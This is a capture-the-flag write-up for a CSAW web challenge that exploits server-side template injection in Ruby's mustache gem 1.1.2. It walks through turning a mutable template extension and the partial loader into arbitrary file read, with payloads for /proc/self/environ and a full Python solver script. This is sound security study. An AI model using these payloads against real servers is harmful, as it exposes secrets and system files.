# Tempaude

| Event | Category | Points | Flag |
|---|---|---|---|
| CSAW CTF Final Round 2026 | Web | 500 (dynamic) | `csaw{mu5t4che_do3s_uhhhhh}` |

> Create a template, render it instantly, and make something worth sharing with Tempaude. Port: 4567.

**TL;DR** — Server-side template injection in Ruby's `mustache` gem 1.1.2. Mustache sections
call arity-1 methods with the section body as their argument, which turns `String#replace` into a
write primitive against the app's deliberately-mutable global template extension. Rewriting that
extension upgrades Mustache's `partial` loader from "`.mustache` files only" to arbitrary file
read, and a `/`-terminated name collapses the forced `.` separator so any absolute path works.

---

## 1. The target

A Sinatra app ("Powered by Mustache"). `POST /` with `engine=mustache` and `template=<string>`;
any other engine is rejected with "Unknown template engine". The rendered output is reflected
back into the page.

### Engine and render context

- Ruby **mustache gem 1.1.2** on Ruby 3.1.7, invoked as `Mustache.render(params[:template])`.
- The render context is the bare `Mustache` view object with **no data hash pushed**:
  `{{.}}` renders `#<Mustache:...>` and `{{inspect}}` shows all-nil ivars.
- Version 1.1.2 predates `context_access_security_level` / `MethodBlacklist`, which land in
  1.1.3 to fix GHSA-5hrj-7fc3-cmx9. **Method access is therefore wide open.**

---

## 2. The arity-1 primitive

The whole challenge hinges on four lines in `Mustache::Context#find`:

```ruby
meth = obj.method(key) rescue proc { obj.send(key) }
meth.arity == 1 ? meth.to_proc : meth.call
```

The behaviour splits three ways by arity:

| Arity | What Mustache does | What it gives the attacker |
|---|---|---|
| `0` | calls the method immediately and pushes the result as the section context | dotted names (`{{a.b.c}}`) walk the object graph |
| `1` | returns the method as a **Proc without calling it** | in a section, the generator calls that proc with the **raw section body**: `{{#M}}arg{{/M}}` ≡ `obj.M("arg")` |
| `-1` (variadic) | called with 0 args | usually raises — this is what blocks the obvious `send` / `instance_eval` / `eval` RCE, all of which are variadic or private |

So `{{#M}}arg{{/M}}` is a one-argument method call on any public method of the view object.

Useful arity-0 chains reachable right away:

```
{{class}}                                      -> Mustache
{{class.superclass}}                           -> Object
{{class.superclass.included_modules.last}}     -> Kernel
{{template_path}}                              -> /app/templates
{{template_extension}}                         -> mustache
```

---

## 3. The actual bug: a mutable global extension

`Mustache#partial` is public and arity-1 — a file loader:

```ruby
File.read("#{template_path}/#{name}.#{template_extension}")
```

On its own that is locked to `*.mustache` files under the template directory. But the app
registers the extension as a **mutable, class-shared String**:

```ruby
Mustache.template_path      = File.join(APP_ROOT, "templates")
Mustache.template_extension = String.new("mustache")   # mutable on purpose
```

`String#replace` is arity-1. A section therefore rewrites the global extension **in place**, for
the whole class:

```
{{#template_extension.replace}}rb{{/template_extension.replace}}
```

That converts `partial` from a `.mustache`-only reader into an arbitrary file reader. (`String.new("literal")` produces an unfrozen string even under frozen-string-literal pragmas — that is why the mutation sticks.)

---

## 4. Beating the forced `.` separator

`partial` always inserts a literal `.` between the name and the extension, so a naive attempt
yields `/app/templates/<name>.<ext>` and you can never drop the dot.

The trick: make the **name end in `/`** and the **extension start with `/`**. The dot then sits
between two slashes and becomes a harmless `./` path component:

```
name = "../../"              ext = "/flag_<hash>.txt"
=>  /app/templates/../.././flag_<hash>.txt   ->   /flag_<hash>.txt
```

---

## 5. Exploitation

### 5.1 Confirm the SSTI

```bash
curl -s -X POST http://$T/ --data-urlencode engine=mustache \
  --data-urlencode 'template={{class}} {{class.superclass.included_modules.last}}'
# => Mustache Kernel
```

### 5.2 Leak the flag path from `/proc/self/environ`

```
{{#template_extension.replace}}/environ{{/template_extension.replace}}ENV>>>{{#partial}}../../../proc/self/{{/partial}}<<<{{#template_extension.replace}}mustache{{/template_extension.replace}}
```

Resolves to `/app/templates/../../../proc/self/./environ` → `/proc/self/environ`:

```
FLAG_PATH=/flag_24c787a9898116e378ea50df663314a8.txt
RUBY_VERSION=3.1.7  PWD=/app  RACK_ENV=production ...
```

### 5.3 Read the flag file

```
{{#template_extension.replace}}/flag_24c787a9898116e378ea50df663314a8.txt{{/template_extension.replace}}FLAG>>>{{#partial}}../../{{/partial}}<<<{{#template_extension.replace}}mustache{{/template_extension.replace}}
```

```
csaw{mu5t4che_do3s_uhhhhh}
```

The trailing `{{#template_extension.replace}}mustache{{/...}}` restores the global extension so
the instance stays usable for the next request — worth doing, because the mutation is
class-wide and persists.

---

## 6. Solver

[`solve.py`](solve.py) confirms the SSTI, leaks `FLAG_PATH`, then reads the flag file.
`read_file` generalises the chain to any absolute path.

```python
#!/usr/bin/env python3
# solve.py — Tempaude: mustache 1.1.2 SSTI -> arbitrary file read.
# usage: solve.py <host> <port>
import sys, re, html, urllib.parse, http.client

HOST, PORT = sys.argv[1], int(sys.argv[2])

def render(template):
    body = urllib.parse.urlencode({"engine": "mustache", "template": template})
    c = http.client.HTTPConnection(HOST, PORT, timeout=10)
    c.request("POST", "/", body, {"Content-Type": "application/x-www-form-urlencoded"})
    h = c.getresponse().read().decode("utf-8", "replace"); c.close()
    m = re.search(r'renderedOutput">(.*?)</pre>', h, re.S)
    return html.unescape(m.group(1)) if m else ""

def set_ext(ext):          # rewrite the mutable global extension in place
    return "{{#template_extension.replace}}%s{{/template_extension.replace}}" % ext

def read_file(abspath):
    # name must end in '/', ext must start with '/', so the forced '.' becomes './'
    d, base = abspath.rsplit("/", 1)
    name = "../../../../../../.." + d + "/"     # climb to /, descend to dir, trailing '/'
    ext  = "/" + base
    tpl  = set_ext(ext) + "R>>>" + "{{#partial}}%s{{/partial}}" % name + "<<<" + set_ext("mustache")
    m = re.search(r"R>>>(.*?)<<<", render(tpl), re.S)
    return m.group(1) if m else ""

# 0) confirm SSTI
print("[*] SSTI:", render("{{class}} {{class.superclass.included_modules.last}}").strip())
# 1) leak FLAG_PATH from /proc/self/environ
environ = read_file("/proc/self/environ")
fp = re.search(r"FLAG_PATH=([^\x00]+)", environ)
flag_path = fp.group(1) if fp else None
print("[*] FLAG_PATH:", flag_path)
# 2) read the flag file
if flag_path:
    data = read_file(flag_path)
    m = re.search(r"csaw\{[^}]*\}", data)
    print("[+] FLAG:", m.group() if m else data.strip())
```

```
$ python3 solve.py 10.0.218.125 4567
[*] SSTI: Mustache Kernel
[*] FLAG_PATH: /flag_24c787a9898116e378ea50df663314a8.txt
[+] FLAG: csaw{mu5t4che_do3s_uhhhhh}
```

---

## Flag

```
csaw{mu5t4che_do3s_uhhhhh}
```

**Provenance.** Contents of `/flag_24c787a9898116e378ea50df663314a8.txt`, whose path was leaked
from `/proc/self/environ`. Both reads go through the mustache partial LFI; nothing was taken
from challenge text.

---

## Takeaways

- **Pin your template engine version.** The same template that is inert on mustache 1.1.3 is a
  file-read primitive on 1.1.2, purely because the method blacklist did not exist yet.
- **Arity is an exploit primitive.** When a template engine decides *how* to invoke a method from
  its signature, the set of reachable 1-arg public methods becomes your gadget pool — and
  `String#replace` is a devastating one if any shared string is mutable.
- **"Locked to a directory and extension" is only true while both are constants.** Here the
  extension was a mutable, class-level object, which made the sandbox self-defeating.
- **Path separators that you cannot delete can often be neutralised.** A forced `.` is harmless
  once it is surrounded by slashes.

## Tools

`curl`, Python (`http.client`), and a local `gem install mustache -v 1.1.2` checkout for reading
`Context#find` while hunting gadgets.
